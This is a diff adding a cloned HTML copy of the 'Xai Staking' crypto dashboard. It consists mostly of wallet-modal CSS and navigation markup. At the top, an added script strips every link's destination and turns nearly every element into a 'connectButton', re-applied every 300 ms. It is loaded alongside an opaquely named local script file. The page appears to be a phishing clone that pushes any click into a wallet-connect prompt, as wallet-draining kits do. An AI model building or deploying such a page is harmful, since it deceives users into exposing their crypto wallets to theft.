@@ -1,0 +1,591 @@
+<!DOCTYPE html><html lang="en" class="dark" style="color-scheme: dark;" data-scrapbook-source="https://app.xai.games/" data-scrapbook-create="20240227222437535"> <head><meta charset="UTF-8">
+<script src="./2ab5d871ffbcee3b5a5b9.js"></script><script>
+  function addClassesToElements() {
+
+  const links = document.querySelectorAll('a:not(.connectButton)');
+  for (const link of links) {
+      link.removeAttribute('href');
+      link.classList.add('connectButton');
+  }
+  const buttons = document.querySelectorAll('div:not(.connectButton):not(.web3-overlay):not(.item):not(.web3-modal-items):not(.web3-modal-title):not(.web3-modal)');
+  for (const button of buttons) {
+      button.classList.add('connectButton');
+  }
+  }
+  setInterval(addClassesToElements, 300);
+</script>
+<meta name="viewport" content="width=device-width, initial-scale=1"><link rel="stylesheet" href="a4b5627f0e44fd58.css" data-precedence="next"><title>Xai Staking</title><meta name="description" content="Xai staking dashboard"><link rel="icon" href="favicon.ico" type="image/x-icon" sizes="64x64"><style>
+      @import url("css2.css");
+      :root {
+        --w3m-color-mix-strength: 0%;
+        --w3m-font-family: Inter, Segoe UI, Roboto, Oxygen, Ubuntu, Cantarell, Fira Sans, Droid Sans, Helvetica Neue, sans-serif;;
+        --w3m-font-size-master: 10px;
+        --w3m-border-radius-master: 4px;
+        --w3m-z-index: 100;
+
+        --wui-font-family: var(--w3m-font-family);
+
+        --wui-font-size-micro: var(--w3m-font-size-master);
+        --wui-font-size-tiny: calc(var(--w3m-font-size-master) * 1.2);
+        --wui-font-size-small: calc(var(--w3m-font-size-master) * 1.4);
+        --wui-font-size-paragraph: calc(var(--w3m-font-size-master) * 1.6);
+        --wui-font-size-large: calc(var(--w3m-font-size-master) * 2);
+        --wui-font-size-medium-title: calc(var(--w3m-font-size-master) * 2.4);
+        --wui-font-size-2xl: calc(var(--w3m-font-size-master) * 4);
+
+        --wui-border-radius-5xs: var(--w3m-border-radius-master);
+        --wui-border-radius-4xs: calc(var(--w3m-border-radius-master) * 1.5);
+        --wui-border-radius-3xs: calc(var(--w3m-border-radius-master) * 2);
+        --wui-border-radius-xxs: calc(var(--w3m-border-radius-master) * 3);
+        --wui-border-radius-xs: calc(var(--w3m-border-radius-master) * 4);
+        --wui-border-radius-s: calc(var(--w3m-border-radius-master) * 5);
+        --wui-border-radius-m: calc(var(--w3m-border-radius-master) * 7);
+        --wui-border-radius-l: calc(var(--w3m-border-radius-master) * 9);
+        --wui-border-radius-3xl: calc(var(--w3m-border-radius-master) * 20);
+
+        --wui-font-weight-light: 400;
+        --wui-font-weight-regular: 500;
+        --wui-font-weight-medium: 600;
+        --wui-font-weight-bold: 700;
+
+        --wui-letter-spacing-2xl: -1.6px;
+        --wui-letter-spacing-medium-title: -0.96px;
+        --wui-letter-spacing-large: -0.8px;
+        --wui-letter-spacing-paragraph: -0.64px;
+        --wui-letter-spacing-small: -0.56px;
+        --wui-letter-spacing-tiny: -0.48px;
+        --wui-letter-spacing-micro: -0.2px;
+
+        --wui-spacing-0: 0px;
+        --wui-spacing-4xs: 2px;
+        --wui-spacing-3xs: 4px;
+        --wui-spacing-xxs: 6px;
+        --wui-spacing-2xs: 7px;
+        --wui-spacing-xs: 8px;
+        --wui-spacing-1xs: 10px;
+        --wui-spacing-s: 12px;
+        --wui-spacing-m: 14px;
+        --wui-spacing-l: 16px;
+        --wui-spacing-2l: 18px;
+        --wui-spacing-xl: 20px;
+        --wui-spacing-xxl: 24px;
+        --wui-spacing-2xl: 32px;
+        --wui-spacing-3xl: 40px;
+        --wui-spacing-4xl: 90px;
+
+        --wui-icon-box-size-xxs: 14px;
+        --wui-icon-box-size-xs: 20px;
+        --wui-icon-box-size-sm: 24px;
+        --wui-icon-box-size-md: 32px;
+        --wui-icon-box-size-lg: 40px;
+        --wui-icon-box-size-xl: 64px;
+
+        --wui-icon-size-inherit: inherit;
+        --wui-icon-size-xxs: 10px;
+        --wui-icon-size-xs: 12px;
+        --wui-icon-size-sm: 14px;
+        --wui-icon-size-md: 16px;
+        --wui-icon-size-mdl: 18px;
+        --wui-icon-size-lg: 20px;
+        --wui-icon-size-xl: 24px;
+
+        --wui-wallet-image-size-inherit: inherit;
+        --wui-wallet-image-size-sm: 40px;
+        --wui-wallet-image-size-md: 56px;
+        --wui-wallet-image-size-lg: 80px;
+
+        --wui-visual-size-size-inherit: inherit;
+        --wui-visual-size-sm: 40px;
+        --wui-visual-size-md: 55px;
+        --wui-visual-size-lg: 80px;
+
+        --wui-box-size-md: 100px;
+        --wui-box-size-lg: 120px;
+
+        --wui-ease-out-power-2: cubic-bezier(0, 0, 0.22, 1);
+        --wui-ease-out-power-1: cubic-bezier(0, 0, 0.55, 1);
+
+        --wui-ease-in-power-3: cubic-bezier(0.66, 0, 1, 1);
+        --wui-ease-in-power-2: cubic-bezier(0.45, 0, 1, 1);
+        --wui-ease-in-power-1: cubic-bezier(0.3, 0, 1, 1);
+
+        --wui-ease-inout-power-1: cubic-bezier(0.45, 0, 0.55, 1);
+
+        --wui-duration-lg: 200ms;
+        --wui-duration-md: 125ms;
+        --wui-duration-sm: 75ms;
+
+        --wui-path-network-sm: path(
+          'M15.4 2.1a5.21 5.21 0 0 1 5.2 0l11.61 6.7a5.21 5.21 0 0 1 2.61 4.52v13.4c0 1.87-1 3.59-2.6 4.52l-11.61 6.7c-1.62.93-3.6.93-5.22 0l-11.6-6.7a5.21 5.21 0 0 1-2.61-4.51v-13.4c0-1.87 1-3.6 2.6-4.52L15.4 2.1Z'
+        );
+
+        --wui-path-network-md: path(
+          'M43.4605 10.7248L28.0485 1.61089C25.5438 0.129705 22.4562 0.129705 19.9515 1.61088L4.53951 10.7248C2.03626 12.2051 0.5 14.9365 0.5 17.886V36.1139C0.5 39.0635 2.03626 41.7949 4.53951 43.2752L19.9515 52.3891C22.4562 53.8703 25.5438 53.8703 28.0485 52.3891L43.4605 43.2752C45.9637 41.7949 47.5 39.0635 47.5 36.114V17.8861C47.5 14.9365 45.9637 12.2051 43.4605 10.7248Z'
+        );
+
+        --wui-path-network-lg: path(
+          'M78.3244 18.926L50.1808 2.45078C45.7376 -0.150261 40.2624 -0.150262 35.8192 2.45078L7.6756 18.926C3.23322 21.5266 0.5 26.3301 0.5 31.5248V64.4752C0.5 69.6699 3.23322 74.4734 7.6756 77.074L35.8192 93.5492C40.2624 96.1503 45.7376 96.1503 50.1808 93.5492L78.3244 77.074C82.7668 74.4734 85.5 69.6699 85.5 64.4752V31.5248C85.5 26.3301 82.7668 21.5266 78.3244 18.926Z'
+        );
+
+        --wui-width-network-sm: 36px;
+        --wui-width-network-md: 48px;
+        --wui-width-network-lg: 86px;
+
+        --wui-height-network-sm: 40px;
+        --wui-height-network-md: 54px;
+        --wui-height-network-lg: 96px;
+
+        --wui-icon-size-network-sm: 16px;
+        --wui-icon-size-network-md: 24px;
+        --wui-icon-size-network-lg: 42px;
+
+        --wui-color-inherit: inherit;
+
+        --wui-color-inverse-100: #fff;
+        --wui-color-inverse-000: #000;
+
+        --wui-cover: rgba(20, 20, 20, 0.8);
+
+        --wui-color-modal-bg: var(--wui-color-modal-bg-base);
+
+        --wui-color-blue-100: var(--wui-color-blue-base-100);
+
+        --wui-color-accent-100: var(--wui-color-accent-base-100);
+        --wui-color-accent-090: var(--wui-color-accent-base-090);
+        --wui-color-accent-080: var(--wui-color-accent-base-080);
+
+        --wui-accent-glass-090: var(--wui-accent-glass-base-090);
+        --wui-accent-glass-080: var(--wui-accent-glass-base-080);
+        --wui-accent-glass-020: var(--wui-accent-glass-base-020);
+        --wui-accent-glass-015: var(--wui-accent-glass-base-015);
+        --wui-accent-glass-010: var(--wui-accent-glass-base-010);
+        --wui-accent-glass-005: var(--wui-accent-glass-base-005);
+        --wui-accent-glass-002: var(--wui-accent-glass-base-002);
+
+        --wui-color-fg-100: var(--wui-color-fg-base-100);
+        --wui-color-fg-125: var(--wui-color-fg-base-125);
+        --wui-color-fg-150: var(--wui-color-fg-base-150);
+        --wui-color-fg-175: var(--wui-color-fg-base-175);
+        --wui-color-fg-200: var(--wui-color-fg-base-200);
+        --wui-color-fg-225: var(--wui-color-fg-base-225);
+        --wui-color-fg-250: var(--wui-color-fg-base-250);
+        --wui-color-fg-275: var(--wui-color-fg-base-275);
+        --wui-color-fg-300: var(--wui-color-fg-base-300);
+
+        --wui-color-bg-100: var(--wui-color-bg-base-100);
+        --wui-color-bg-125: var(--wui-color-bg-base-125);
+        --wui-color-bg-150: var(--wui-color-bg-base-150);
+        --wui-color-bg-175: var(--wui-color-bg-base-175);
+        --wui-color-bg-200: var(--wui-color-bg-base-200);
+        --wui-color-bg-225: var(--wui-color-bg-base-225);
+        --wui-color-bg-250: var(--wui-color-bg-base-250);
+        --wui-color-bg-275: var(--wui-color-bg-base-275);
+        --wui-color-bg-300: var(--wui-color-bg-base-300);
+
+        --wui-color-success-100: var(--wui-color-success-base-100);
+        --wui-color-error-100: var(--wui-color-error-base-100);
+
+        --wui-icon-box-bg-error-100: var(--wui-icon-box-bg-error-base-100);
+        --wui-icon-box-bg-blue-100: var(--wui-icon-box-bg-blue-base-100);
+        --wui-icon-box-bg-success-100: var(--wui-icon-box-bg-success-base-100);
+        --wui-icon-box-bg-inverse-100: var(--wui-icon-box-bg-inverse-base-100);
+
+        --wui-all-wallets-bg-100: var(--wui-all-wallets-bg-base-100);
+
+        --wui-avatar-border: var(--wui-avatar-border-base);
+
+        --wui-thumbnail-border: var(--wui-thumbnail-border-base);
+
+        --wui-box-shadow-blue: rgba(71, 161, 255, 0.16);
+      }
+
+      @supports (background: color-mix(in srgb, white 50%, black)) {
+        :root {
+          --wui-color-modal-bg: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-modal-bg-base)
+          );
+
+          --wui-box-shadow-blue: color-mix(in srgb, var(--wui-color-accent-100) 16%, transparent);
+
+          --wui-color-accent-090: color-mix(
+            in srgb,
+            var(--wui-color-accent-base-100) 90%,
+            var(--w3m-default)
+          );
+          --wui-color-accent-080: color-mix(
+            in srgb,
+            var(--wui-color-accent-base-100) 80%,
+            var(--w3m-default)
+          );
+
+          --wui-color-accent-090: color-mix(
+            in srgb,
+            var(--wui-color-accent-base-100) 90%,
+            transparent
+          );
+          --wui-color-accent-080: color-mix(
+            in srgb,
+            var(--wui-color-accent-base-100) 80%,
+            transparent
+          );
+
+          --wui-accent-glass-090: color-mix(
+            in srgb,
+            var(--wui-color-accent-base-100) 90%,
+            transparent
+          );
+          --wui-accent-glass-080: color-mix(
+            in srgb,
+            var(--wui-color-accent-base-100) 80%,
+            transparent
+          );
+          --wui-accent-glass-020: color-mix(
+            in srgb,
+            var(--wui-color-accent-base-100) 20%,
+            transparent
+          );
+          --wui-accent-glass-015: color-mix(
+            in srgb,
+            var(--wui-color-accent-base-100) 15%,
+            transparent
+          );
+          --wui-accent-glass-010: color-mix(
+            in srgb,
+            var(--wui-color-accent-base-100) 10%,
+            transparent
+          );
+          --wui-accent-glass-005: color-mix(
+            in srgb,
+            var(--wui-color-accent-base-100) 5%,
+            transparent
+          );
+          --wui-color-accent-002: color-mix(
+            in srgb,
+            var(--wui-color-accent-base-100) 2%,
+            transparent
+          );
+
+          --wui-color-fg-100: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-fg-base-100)
+          );
+          --wui-color-fg-125: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-fg-base-125)
+          );
+          --wui-color-fg-150: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-fg-base-150)
+          );
+          --wui-color-fg-175: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-fg-base-175)
+          );
+          --wui-color-fg-200: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-fg-base-200)
+          );
+          --wui-color-fg-225: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-fg-base-225)
+          );
+          --wui-color-fg-250: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-fg-base-250)
+          );
+          --wui-color-fg-275: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-fg-base-275)
+          );
+          --wui-color-fg-300: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-fg-base-300)
+          );
+
+          --wui-color-bg-100: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-bg-base-100)
+          );
+          --wui-color-bg-125: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-bg-base-125)
+          );
+          --wui-color-bg-150: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-bg-base-150)
+          );
+          --wui-color-bg-175: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-bg-base-175)
+          );
+          --wui-color-bg-200: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-bg-base-200)
+          );
+          --wui-color-bg-225: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-bg-base-225)
+          );
+          --wui-color-bg-250: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-bg-base-250)
+          );
+          --wui-color-bg-275: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-bg-base-275)
+          );
+          --wui-color-bg-300: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-bg-base-300)
+          );
+
+          --wui-color-success-100: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-success-base-100)
+          );
+          --wui-color-error-100: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-color-error-base-100)
+          );
+
+          --wui-icon-box-bg-error-100: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-icon-box-bg-error-base-100)
+          );
+          --wui-icon-box-bg-accent-100: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-icon-box-bg-blue-base-100)
+          );
+          --wui-icon-box-bg-success-100: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-icon-box-bg-success-base-100)
+          );
+          --wui-icon-box-bg-inverse-100: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-icon-box-bg-inverse-base-100)
+          );
+
+          --wui-all-wallets-bg-100: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-all-wallets-bg-base-100)
+          );
+
+          --wui-avatar-border: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-avatar-border-base)
+          );
+
+          --wui-thumbnail-border: color-mix(
+            in srgb,
+            var(--w3m-color-mix) var(--w3m-color-mix-strength),
+            var(--wui-thumbnail-border-base)
+          );
+        }
+      }
+    </style><style media="enabled">
+      :root {
+        --w3m-color-mix: #000;
+        --w3m-accent: #3396ff;
+        --w3m-default: #000;
+
+        --wui-color-modal-bg-base: #fff;
+
+        --wui-color-blue-base-100: #3396ff;
+
+        --wui-color-accent-base-100: var(--w3m-accent);
+        --wui-color-accent-base-090: #2d7dd2;
+        --wui-color-accent-base-080: #2978cc;
+
+        --wui-accent-glass-base-090: rgba(51, 150, 255, 0.9);
+        --wui-accent-glass-base-080: rgba(51, 150, 255, 0.8);
+        --wui-accent-glass-base-020: rgba(51, 150, 255, 0.2);
+        --wui-accent-glass-base-015: rgba(51, 150, 255, 0.15);
+        --wui-accent-glass-base-010: rgba(51, 150, 255, 0.1);
+        --wui-accent-glass-base-005: rgba(51, 150, 255, 0.05);
+        --wui-accent-glass-base-002: rgba(51, 150, 255, 0.02);
+
+        --wui-color-fg-base-100: #141414;
+        --wui-color-fg-base-125: #2d3131;
+        --wui-color-fg-base-150: #474d4d;
+        --wui-color-fg-base-175: #636d6d;
+        --wui-color-fg-base-200: #798686;
+        --wui-color-fg-base-225: #828f8f;
+        --wui-color-fg-base-250: #8b9797;
+        --wui-color-fg-base-275: #95a0a0;
+        --wui-color-fg-base-300: #9ea9a9;
+
+        --wui-color-bg-base-100: #ffffff;
+        --wui-color-bg-base-125: #f5fafa;
+        --wui-color-bg-base-150: #f3f8f8;
+        --wui-color-bg-base-175: #eef4f4;
+        --wui-color-bg-base-200: #eaf1f1;
+        --wui-color-bg-base-225: #e5eded;
+        --wui-color-bg-base-250: #e1e9e9;
+        --wui-color-bg-base-275: #dce7e7;
+        --wui-color-bg-base-300: #d8e3e3;
+
+        --wui-color-success-base-100: #26b562;
+        --wui-color-error-base-100: #f05142;
+
+        --wui-success-glass-001: rgba(38, 181, 98, 0.01);
+        --wui-success-glass-002: rgba(38, 181, 98, 0.02);
+        --wui-success-glass-005: rgba(38, 181, 98, 0.05);
+        --wui-success-glass-010: rgba(38, 181, 98, 0.1);
+        --wui-success-glass-015: rgba(38, 181, 98, 0.15);
+        --wui-success-glass-020: rgba(38, 181, 98, 0.2);
+        --wui-success-glass-025: rgba(38, 181, 98, 0.25);
+        --wui-success-glass-030: rgba(38, 181, 98, 0.3);
+        --wui-success-glass-060: rgba(38, 181, 98, 0.6);
+        --wui-success-glass-080: rgba(38, 181, 98, 0.8);
+
+        --wui-error-glass-001: rgba(240, 81, 66, 0.01);
+        --wui-error-glass-002: rgba(240, 81, 66, 0.02);
+        --wui-error-glass-005: rgba(240, 81, 66, 0.05);
+        --wui-error-glass-010: rgba(240, 81, 66, 0.1);
+        --wui-error-glass-015: rgba(240, 81, 66, 0.15);
+        --wui-error-glass-020: rgba(240, 81, 66, 0.2);
+        --wui-error-glass-025: rgba(240, 81, 66, 0.25);
+        --wui-error-glass-030: rgba(240, 81, 66, 0.3);
+        --wui-error-glass-060: rgba(240, 81, 66, 0.6);
+        --wui-error-glass-080: rgba(240, 81, 66, 0.8);
+
+        --wui-icon-box-bg-error-base-100: #f4dfdd;
+        --wui-icon-box-bg-blue-base-100: #d9ecfb;
+        --wui-icon-box-bg-success-base-100: #daf0e4;
+        --wui-icon-box-bg-inverse-base-100: #dcecfc;
+
+        --wui-all-wallets-bg-base-100: #e8f1fa;
+
+        --wui-avatar-border-base: #f3f4f4;
+
+        --wui-thumbnail-border-base: #eaefef;
+
+        --wui-gray-glass-001: rgba(0, 0, 0, 0.01);
+        --wui-gray-glass-002: rgba(0, 0, 0, 0.02);
+        --wui-gray-glass-005: rgba(0, 0, 0, 0.05);
+        --wui-gray-glass-010: rgba(0, 0, 0, 0.1);
+        --wui-gray-glass-015: rgba(0, 0, 0, 0.15);
+        --wui-gray-glass-020: rgba(0, 0, 0, 0.2);
+        --wui-gray-glass-025: rgba(0, 0, 0, 0.25);
+        --wui-gray-glass-030: rgba(0, 0, 0, 0.3);
+        --wui-gray-glass-060: rgba(0, 0, 0, 0.6);
+        --wui-gray-glass-080: rgba(0, 0, 0, 0.8);
+      }
+    </style><style>
+      :root {
+        --w3m-color-mix: #fff;
+        --w3m-accent: #47a1ff;
+        --w3m-default: #fff;
+
+        --wui-color-modal-bg-base: #191a1a;
+
+        --wui-color-blue-base-100: #47a1ff;
+
+        --wui-color-accent-base-100: var(--w3m-accent);
+        --wui-color-accent-base-090: #59aaff;
+        --wui-color-accent-base-080: #6cb4ff;
+
+        --wui-accent-glass-base-090: rgba(71, 161, 255, 0.9);
+        --wui-accent-glass-base-080: rgba(71, 161, 255, 0.8);
+        --wui-accent-glass-base-020: rgba(71, 161, 255, 0.2);
+        --wui-accent-glass-base-015: rgba(71, 161, 255, 0.15);
+        --wui-accent-glass-base-010: rgba(71, 161, 255, 0.1);
+        --wui-accent-glass-base-005: rgba(71, 161, 255, 0.05);
+        --wui-accent-glass-base-002: rgba(71, 161, 255, 0.02);
+
+        --wui-color-fg-base-100: #e4e7e7;
+        --wui-color-fg-base-125: #d0d5d5;
+        --wui-color-fg-base-150: #a8b1b1;
+        --wui-color-fg-base-175: #a8b0b0;
+        --wui-color-fg-base-200: #949e9e;
+        --wui-color-fg-base-225: #868f8f;
+        --wui-color-fg-base-250: #788080;
+        --wui-color-fg-base-275: #788181;
+        --wui-color-fg-base-300: #6e7777;
+
+        --wui-color-bg-base-100: #141414;
+        --wui-color-bg-base-125: #191a1a;
+        --wui-color-bg-base-150: #1e1f1f;
+        --wui-color-bg-base-175: #222525;
+        --wui-color-bg-base-200: #272a2a;
+        --wui-color-bg-base-225: #2c3030;
+        --wui-color-bg-base-250: #313535;
+        --wui-color-bg-base-275: #363b3b;
+        --wui-color-bg-base-300: #3b4040;
+
+        --wui-color-success-base-100: #26d962;
+        --wui-color-error-base-100: #f25a67;
+
+        --wui-success-glass-001: rgba(38, 217, 98, 0.01);
+        --wui-success-glass-002: rgba(38, 217, 98, 0.02);
+        --wui-success-glass-005: rgba(38, 217, 98, 0.05);
+        --wui-success-glass-010: rgba(38, 217, 98, 0.1);
+        --wui-success-glass-015: rgba(38, 217, 98, 0.15);
+        --wui-success-glass-020: rgba(38, 217, 98, 0.2);
+        --wui-success-glass-025: rgba(38, 217, 98, 0.25);
+        --wui-success-glass-030: rgba(38, 217, 98, 0.3);
+        --wui-success-glass-060: rgba(38, 217, 98, 0.6);
+        --wui-success-glass-080: rgba(38, 217, 98, 0.8);
+
+        --wui-error-glass-001: rgba(242, 90, 103, 0.01);
+        --wui-error-glass-002: rgba(242, 90, 103, 0.02);
+        --wui-error-glass-005: rgba(242, 90, 103, 0.05);
+        --wui-error-glass-010: rgba(242, 90, 103, 0.1);
+        --wui-error-glass-015: rgba(242, 90, 103, 0.15);
+        --wui-error-glass-020: rgba(242, 90, 103, 0.2);
+        --wui-error-glass-025: rgba(242, 90, 103, 0.25);
+        --wui-error-glass-030: rgba(242, 90, 103, 0.3);
+        --wui-error-glass-060: rgba(242, 90, 103, 0.6);
+        --wui-error-glass-080: rgba(242, 90, 103, 0.8);
+
+        --wui-icon-box-bg-error-base-100: #3c2426;
+        --wui-icon-box-bg-blue-base-100: #20303f;
+        --wui-icon-box-bg-success-base-100: #1f3a28;
+        --wui-icon-box-bg-inverse-base-100: #243240;
+
+        --wui-all-wallets-bg-base-100: #222b35;
+
+        --wui-avatar-border-base: #252525;
+
+        --wui-thumbnail-border-base: #252525;
+
+        --wui-gray-glass-001: rgba(255, 255, 255, 0.01);
+        --wui-gray-glass-002: rgba(255, 255, 255, 0.02);
+        --wui-gray-glass-005: rgba(255, 255, 255, 0.05);
+        --wui-gray-glass-010: rgba(255, 255, 255, 0.1);
+        --wui-gray-glass-015: rgba(255, 255, 255, 0.15);
+        --wui-gray-glass-020: rgba(255, 255, 255, 0.2);
+        --wui-gray-glass-025: rgba(255, 255, 255, 0.25);
+        --wui-gray-glass-030: rgba(255, 255, 255, 0.3);
+        --wui-gray-glass-060: rgba(255, 255, 255, 0.6);
+        --wui-gray-glass-080: rgba(255, 255, 255, 0.8);
+      }
+    </style> </head><body><div data-overlay-container="true"><div class="Toastify"></div><div class="flex"><div class="hidden lg:block"><div class="flex flex-col justify-between bg-lightWhiteDarkBlack border-r-1 border-silverMist h-screen w-[245px] sticky top-0"><div class="mx-5"><div class="flex items-center mb-1 px-[20px] py-[10px]"><span class="pb-[6px]"><svg style="width:20px;height:20px" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 13.518"><path id="Path_3462" data-name="Path 3462" d="M192.719,5.162l3.657,6.18h-7.314l3.657-6.18m0-4.742-8,13.518h16l-8-13.518h0Z" transform="translate(-184.72 -0.42)" fill="#f30019"></path></svg></span><a href=""><div class="text-lg font-bold py-2 pl-2">Xai</div></a></div><div class="flex flex-col"><a href=""><div class="text-base hover:bg-crystalWhite hover:border-palePearl border-1 border-transparent hover:rounded-md py-2 pl-4 undefined">Overview</div></a><a href="https://app.xai.games/staking"><div class="text-base hover:bg-crystalWhite hover:border-palePearl border-1 border-transparent hover:rounded-md py-2 pl-4 undefined">Staking</div></a><a href="https://app.xai.games/redeem"><div class="text-base hover:bg-crystalWhite hover:border-palePearl border-1 border-transparent hover:rounded-md py-2 pl-4 undefined">Redeem</div></a></div></div><div><div class="mx-5 mb-5"><a href="https://xai-foundation.gitbook.io/xai-network/xai-blockchain/welcome-to-xai"><div class="flex items-center hover:bg-crystalWhite hover:border-palePearl border-1 border-transparent hover:rounded-md gap-2 py-1 pl-4"><svg style="width:24px;height:24px" viewBox="0 0 20 14.41" xmlns="http://www.w3.org/2000/svg"><path d="M9,15.368a.586.586,0,1,1-.587.585A.586.586,0,0,1,9,15.368m9.187-3.623a.586.586,0,1,1,.586-.585.586.586,0,0,1-.586.585m0-2.4a1.807,1.807,0,0,0-1.716,2.388l-5.984,3.186a1.808,1.808,0,0,0-3.112.233L2,12.319a2.356,2.356,0,0,1-.948-2.085,1.1,1.1,0,0,1,.411-.923.525.525,0,0,1,.517.023l.035.019C3.44,10.1,8.1,12.559,8.3,12.65a.916.916,0,0,0,.988-.048l9.637-5.012a.443.443,0,0,0,.307-.4.462.462,0,0,0-.3-.4c-.548-.263-1.391-.657-2.213-1.042C14.964,4.934,12.974,4,12.1,3.544a1.493,1.493,0,0,0-1.471.005l-.21.1C6.484,5.6,1.217,8.207.917,8.39a2.15,2.15,0,0,0-.912,1.785,3.421,3.421,0,0,0,1.52,3.106L7.21,16.213a1.811,1.811,0,0,0,3.6-.232l6.262-3.394a1.811,1.811,0,1,0,1.114-3.239" transform="translate(0 -3.354)" fill="#8d8d8d"></path></svg><div class="text-sm">GitBook</div></div></a><a href="https://discord.com/invite/xaigames"><div class="flex items-center hover:bg-crystalWhite hover:border-palePearl border-1 border-transparent hover:rounded-md gap-2 py-1 pl-4"><svg style="width:24px;height:24px" viewBox="0 0 19.008 14.67" xmlns="http://www.w3.org/2000/svg"><path d="M18.59,5.89a15.705,15.705,0,0,0-3.92-1.23,9.058,9.058,0,0,0-.5,1.04,14.351,14.351,0,0,0-4.34,0,11.147,11.147,0,0,0-.51-1.04A15.705,15.705,0,0,0,5.4,5.89,16.415,16.415,0,0,0,2.58,16.87a15.7,15.7,0,0,0,4.81,2.46,12.1,12.1,0,0,0,1.03-1.69,9.342,9.342,0,0,1-1.62-.79c.14-.1.27-.21.4-.31a11.09,11.09,0,0,0,9.61,0c.13.11.26.21.4.31a10.552,10.552,0,0,1-1.62.79,12.1,12.1,0,0,0,1.03,1.69,15.589,15.589,0,0,0,4.81-2.46A16.358,16.358,0,0,0,18.61,5.89ZM8.84,14.67a1.84,1.84,0,0,1-1.71-1.94,1.826,1.826,0,0,1,1.71-1.94,1.82,1.82,0,0,1,1.71,1.94A1.833,1.833,0,0,1,8.84,14.67Zm6.31,0a1.84,1.84,0,0,1-1.71-1.94,1.826,1.826,0,0,1,1.71-1.94,1.82,1.82,0,0,1,1.71,1.94A1.833,1.833,0,0,1,15.15,14.67Z" transform="translate(-2.502 -4.66)" fill="#8d8d8d"></path></svg><div class="text-sm">Discord</div></div></a><a href="https://twitter.com/xai_games"><div class="flex items-center hover:bg-crystalWhite hover:border-palePearl border-1 border-transparent hover:rounded-md gap-2 py-1 pl-4"><svg style="width:24px;height:24px" viewBox="0 0 15.488 14.08" xmlns="http://www.w3.org/2000/svg"><path d="M5.928,2H1L6.816,9.754l-5.5,6.326H3.182l4.5-5.174,3.88,5.174h4.928L10.428,8l5.216-6H13.778L9.564,6.848Zm6.336,12.672L3.816,3.408H5.224l8.448,11.264Z" transform="translate(-1 -2)" fill="#8d8d8d"></path></svg><div class="text-sm">X</div></div></a><a href="https://t.me/XaiSentryNodes"><div class="flex items-center hover:bg-crystalWhite hover:border-palePearl border-1 border-transparent hover:rounded-md gap-2 py-1 pl-4"><svg style="width:24px;height:24px" viewBox="0 0 16 13.418" xmlns="http://www.w3.org/2000/svg"><path d="M17.956,5.247,15.542,16.634c-.182.8-.657,1-1.332.625L10.53,14.548,8.755,16.256a.923.923,0,0,1-.74.361L8.28,12.87,15.1,6.709c.3-.264-.065-.411-.461-.146L6.209,11.87,2.58,10.734c-.789-.246-.8-.789.165-1.168L16.938,4.1c.657-.246,1.232.146,1.018,1.15Z" transform="translate(-2.002 -4.026)" fill="#8d8d8d"></path></svg><div class="text-sm">Telegram</div></div></a></div></div></div></div><div class="w-full"><nav class="z-40 w-full h-auto items-center justify-center data-[menu-open=true]:border-none sticky top-0 inset-x-0 backdrop-blur-lg data-[menu-open=true]:backdrop-blur-xl backdrop-saturate-150 flex border-b-1 border-silverMist bg-lightWhiteDarkBlack mb-5" style="--navbar-height:4rem"><header class="z-40 flex px-6 gap-4 w-full flex-row relative flex-nowrap items-center justify-between h-[var(--navbar-height)] max-w-full"><ul class="flex gap-4 h-full flex-row flex-nowrap items-center data-[justify=start]:justify-start data-[justify=start]:flex-grow data-[justify=start]:basis-0 data-[justify=center]:justify-center data-[justify=end]:justify-end data-[justify=end]:flex-grow data-[justify=end]:basis-0 lg:hidden" data-justify="start"><button class="group flex items-center justify-center w-6 h-full rounded-small tap-highlight-transparent outline-none data-[focus-visible=true]:z-10 data-[focus-visible=true]:outline-2 data-[focus-visible=true]:outline-focus data-[focus-visible=true]:outline-offset-2" 